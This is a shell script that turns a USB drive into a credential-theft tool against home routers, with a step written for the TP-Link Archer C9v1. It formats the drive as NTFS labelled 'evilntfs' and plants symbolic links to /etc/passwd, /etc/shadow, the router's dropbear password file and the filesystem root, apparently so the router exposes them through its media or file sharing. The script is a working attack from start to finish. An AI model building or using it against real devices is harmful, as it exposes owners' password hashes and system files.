device=$1

if test -b "$device"; then
	echo "Found device $device"
else
	echo "Device $device not found."
	exit 1
fi

# Partition device with ~512 MB partition
echo "Partitioning $device"
parted -s -a opt $device mklabel msdos mkpart primary 512 1G

# wait for a few sec
echo "Sleeping for a few seconds..."
sleep 5

# Format USB drive as NTFS
partition="$device"1

if test -b "$partition"; then
	echo "Block device $partition exists."
	echo "Formatting as NTFS."
	mkfs.ntfs -Q -L evilntfs $partition
fi

# Mount as NTFS
folder=/tmp/$RANDOM
mkdir $folder
echo "Mounting $partition at $folder"
mount -t ntfs $partition $folder

# Add symlinks to password files
# .wav extension makes the file viewable over dlna
echo "Creating symbolic links"
cd $folder
ln -s /etc/passwd passwd
ln -s /etc/shadow shadow

# Archer C9v1 specific
ln -s /tmp/dropbear/dropbearpwd dropbearpwd

# Add symlink to root of filesystem
ln -s / rootfs

# Show files
echo "Created the following in $folder"
ls -la $folder

# Unmount
cd /
echo "Umounting $folder"
umount $folder
rm -rf $folder

